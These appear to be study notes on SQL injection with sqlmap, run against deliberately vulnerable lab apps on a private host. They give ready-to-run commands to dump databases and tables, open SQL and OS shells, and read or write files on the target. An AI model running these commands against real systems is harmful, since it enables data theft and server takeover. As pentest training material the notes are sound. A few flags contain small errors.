
Automated SQLi

- One of the tools used to perform SQL injection via command line is sqlmap.

sqlmap -u <url> -p <id> --cookie <cookie>


* `-u`: target URL
* `-p`: parameter
* `--cookie`: helps sqlmap use cookies if available. Uses cookies in the GET method.

Example:
sqlmap -u "http://10.10.10.20/dvwa/vulnerabilities/sqli/?id=b&Submit=Submit#" -p "id" --cookie "security=low; security_level=0; BEEFHOOK=wKD7kSgo51ITJH6duJFE93BIWM4T0Qc0G2pXeGaIiI05hQOUzKJPlA4zKDGJBHETVUzF0RTItkHoMZJX; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=8ic7o35mhb633tdjkikp1a6hg3"



sqlmap -u <url> -p <parameter> --cookie <cookie> --flush-session --batch --dbs

* `flush-session`: clears any previous session data.
* `batch`: automatically chooses default answers for prompts.
* `dbs`: lists the databases on the target system.


sqlmap -u <url> -p <parameter> --cookie <cookie> --flush-session --batch --dbs --current-db

* `D`: used to select the database.
* `level`: increases the intensity of the scan (default is 1 but can go up to 5).
* `current-db`: shows which database the operations are being performed on.


sqlmap -u <url> -p <parameter> --cookie <cookie> --flush-session --batch --dbs -D <databaseName> --tables

* `tables`: lists the tables in the selected database.
* `T`: used for tables.


sqlmap -u <url> -p <parameter> --cookie <cookie> --flush-session --batch --dbs -D <databaseName> --T <tableName> --columns

* `columns`: lists the columns in the selected table.
* `C`: used for columns.


sqlmap -u <url> -p <parameter> --cookie <cookie> --flush-session --batch --dbs -D <databaseName> -T <tableName> -C <columnName,ColumnName> --dump


* Dumps the specified columns from the table in the given database.

sqlmap -u <url> -p <parameter> --cookie <cookie> --flush-session --batch --dbs -D <databaseName> -T <tableName> --dump


* Dumps all columns from the table.

* GET method uses `cookie`
* POST method uses `data`

If POST:

sqlmap -u <url> --data <data> -p "<parameter>" --cookie <"cookie"> --flush-session --dbs

Example:
```sql
sqlmap -u "http://10.10.10.20/mutillidae/index.php?page=login.php" --data "username=a&password=b&login-php-submit-button=Login" -p "username,password" --cookie "showhints=1; security_level=0; BEEFHOOK=wKD7kSgo51ITJH6duJFE93BIWM4T0Qc0G2pXeGaIiI05hQOUzKJPlA4zKDGJBHETVUzF0RTItkHoMZJX; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=8ic7o35mhb633tdjkikp1a6hg3" --flush-session --dbs
```


sqlmap -u "http://10.10.10.20/bWAPP/sqli_1.php?title=a&action=search" -p "title" --cookie "security_level=0; BEEFHOOK=wKD7kSgo51ITJH6duJFE93BIWM4T0Qc0G2pXeGaIiI05hQOUzKJPlA4zKDGJBHETVUzF0RTItkHoMZJX; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=tnkj769n5dmb6clfjkuu37bk52" --level 5 --risk 3 --sql-shell


* `sql-shell`: used to get an SQL shell.
* `os-shell`: used to get an OS shell.


sqlmap -u <url> --data <data> -p "<parameter>" --cookie <"cookie"> --file-read <"path_to_file">


* `file-read`: reads the file from the given path and provides the location to access it.


sqlmap -u <url> --data <data> -p "<parameter>" --cookie <"cookie"> --file-write <"path_to_file"> --file-dest <destination>


* `file-write`: writes data to the given file path.
* Example:

sqlmap -u "http://targeturl" --file-write "/path/to/local/file" --file-dest "/path/to/remote/file"

In this example, the local file (`/path/to/local/file`) is written to the specified remote target file path (`/path/to/remote/file`).